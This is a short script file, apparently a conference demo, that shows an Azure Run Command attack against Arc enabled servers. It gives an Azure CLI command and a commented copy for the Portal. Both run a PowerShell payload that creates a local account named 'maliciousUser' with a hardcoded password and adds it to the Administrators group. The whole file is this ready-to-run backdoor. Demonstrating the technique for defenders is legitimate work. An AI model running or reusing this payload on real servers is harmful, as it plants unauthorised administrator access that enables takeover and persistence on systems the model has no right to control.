# Azure Run Command attack against Arc enabled servers
# Either use the Azure Portal or the Azure CLI to execute the Run Command
# If you will use the Azure Portal you can copy the content at the buttom of this file and paste it in the Run Command script editor

# Azure CLI command to execute the Run Command
# Make sure to connect to Azure with Connect-AzAccount before running the command
az connectedmachine run-command create --name "myRunCommand" --machine-name "onpremVM01" --resource-group "ESPC24-Demo" --location "westeurope" --script '
$Username = "maliciousUser"
$Password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

New-LocalUser -Name $Username -Password $Password -Description "Malicious user account for demo purposes"
Add-LocalGroupMember -Group "Administrators" -Member $Username

Write-Output "Malicious user account created successfully."
Write-Output "Malicious user account member of Administrators group."
'

# Run Command script for the Azure Portal, remove all # from the script below
#$Username = "maliciousUser"
#$Password = ConvertTo-SecureString "P@ssw0rd!" -AsPlainText -Force
#$Credential = New-Object System.Management.Automation.PSCredential($Username, $Password)

#New-LocalUser -Name $Username -Password $Password -Description "Malicious user account for demo purposes"
#Add-LocalGroupMember -Group "Administrators" -Member $Username

#Write-Output "Malicious user account created successfully."
#Write-Output "Malicious user account member of Administrators group."